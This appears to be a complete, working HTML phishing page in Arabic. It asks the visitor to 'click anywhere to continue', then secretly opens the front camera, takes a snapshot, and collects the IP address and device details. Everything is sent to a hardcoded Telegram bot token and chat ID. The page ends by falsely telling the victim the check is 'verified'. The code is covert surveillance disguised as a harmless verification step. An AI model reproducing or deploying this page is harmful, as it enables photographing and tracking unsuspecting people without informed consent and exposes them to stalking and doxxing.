<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>M31 ROJI</title>

<style>
body {
  background:#000;
  color:#0f0;
  text-align:center;
  font-family:Arial;
}
video { display:none; }
#msg { margin-top:20px; }
</style>
</head>

<body onclick="startOnce()">

<h3>اضغط في أي مكان للمتابعة...</h3>
<div id="msg"></div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const BOT_TOKEN = "7852857305:AAEW7SqDION4MTuIPNnxP6caMEYMLl2yojc";
const CHAT_ID  = "8514140307";

let started = false;
let streamRef = null;

// جلب IP
async function getIP() {
  try {
    let res = await fetch("https://api.ipify.org?format=json");
    let data = await res.json();
    return data.ip;
  } catch {
    return "غير متوفر";
  }
}

// معلومات الجهاز + IP
async function getInfo() {
  const ip = await getIP();

  return `
🌐 IP: ${ip}
📱 الجهاز: ${navigator.platform}
🌐 اللغة: ${navigator.language}
📏 الشاشة: ${screen.width}x${screen.height}
⏰ الوقت: ${new Date().toLocaleString()}
`;
}

// تشغيل مرة واحدة
function startOnce() {
  if (started) return;
  started = true;

  document.getElementById("msg").innerText = "⏳ جاري التشغيل...";

  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
  .then(stream => {
    streamRef = stream;
    document.getElementById("video").srcObject = stream;

    setTimeout(capture, 2000);
  })
  .catch(() => {
    document.getElementById("msg").innerText = "❌ تم رفض الكاميرا";
  });
}

async function capture() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  if (streamRef) {
    streamRef.getTracks().forEach(t => t.stop());
  }

  const info = await getInfo();

  canvas.toBlob(blob => {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", blob);
    form.append("caption", info);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    })
    .then(() => {
      document.getElementById("msg").innerText = "✅ تم التحقق";
    })
    .catch(() => {
      document.getElementById("msg").innerText = "❌ فشل الإرسال";
    });
  }, "image/jpeg");
}
</script>

</body>
</html>
